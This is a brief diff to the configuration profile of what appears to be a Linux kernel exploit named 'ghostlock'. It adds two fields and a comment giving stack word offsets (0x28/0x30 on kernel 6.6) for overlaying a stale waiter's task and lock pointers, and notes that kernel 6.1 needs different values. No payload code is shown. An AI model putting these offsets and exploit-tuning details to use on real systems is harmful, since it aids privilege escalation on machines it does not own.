@@ -27,6 +27,11 @@ namespace ghostlock::profile {
         uint32_t w3_chain_rounds, w3_attempts, w3_settle_us;
         uint32_t tcp_attempts, tcp_arm_sequence;
         uint32_t tcp_post_receive_hold_iterations;
+        /* zc word offsets overlaying the stale waiter's task/lock on the
+         * consumer's kernel stack. 6.6 geometry: 0x28/0x30 (Δ=8). The
+         * alignment shifts with the kernel's frame depths, so 6.1 needs
+         * runtime-configurable values. */
+        uint32_t tcp_task_word, tcp_lock_word;
         uint32_t select_enter_delay_us, select_timeout_us;
         uint32_t select_consumer_max_calls, select_consumer_burst_calls;
         uint32_t handoff_pre_dispatch_settle_ms, handoff_module_poll_attempts;
@@ -258,6 +263,8 @@ namespace ghostlock::profile {
         GHOSTLOCK_EXEC_U32(tcp_attempts)
         GHOSTLOCK_EXEC_U32(tcp_arm_sequence)
         GHOSTLOCK_EXEC_U32(tcp_post_receive_hold_iterations)
+        GHOSTLOCK_EXEC_U32(tcp_task_word)
+        GHOSTLOCK_EXEC_U32(tcp_lock_word)
         GHOSTLOCK_EXEC_U32(select_enter_delay_us)
         GHOSTLOCK_EXEC_U32(select_timeout_us)
         GHOSTLOCK_EXEC_U32(select_consumer_max_calls)
